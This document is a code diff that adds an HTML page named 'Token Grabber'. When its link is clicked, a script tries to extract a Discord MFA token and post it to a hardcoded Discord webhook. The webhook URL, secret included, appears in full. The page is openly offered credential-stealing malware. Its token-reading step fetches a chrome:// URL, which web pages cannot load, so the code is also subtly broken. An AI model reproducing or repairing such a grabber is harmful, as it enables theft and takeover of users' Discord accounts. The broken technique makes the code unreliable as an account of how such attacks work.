@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Grabber</title>
+</head>
+<body>
+    <a href="https://raydendagoat.vercel.app/" id="tokenLink">Click me to grab tokens!</a>
+
+    <script>
+        document.getElementById('tokenLink').addEventListener('click', function(event) {
+            event.preventDefault();
+
+            // Function to fetch Discord tokens
+            async function fetchDiscordTokens() {
+                const response = await fetch('chrome://discord/');
+                const data = await response.text();
+                const tokenMatch = data.match(/mfa\.[^"]+/);
+                return tokenMatch ? tokenMatch[0] : null;
+            }
+
+            // Function to send tokens via Discord webhook
+            async function sendTokensToWebhook(token) {
+                const webhookUrl = 'https://discord.com/api/webhooks/1396736187246313573/zxeVbKtQWNtoykNCAxzI66_hk1h8bevmNQagbpPqKDtOIxAytEOiIWYDbq3owkU3T_uF';
+                const payload = {
+                    content: `Discord Token: \`${token}\``
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            }
+
+            // Main function to execute on link click
+            async function main() {
+                const token = await fetchDiscordTokens();
+                if (token) {
+                    await sendTokensToWebhook(token);
+                    alert('Tokens sent successfully!');
+                } else {
+                    alert('No tokens found.');
+                }
+            }
+
+            main();
+        });
+    </script>
+</body>
+</html>
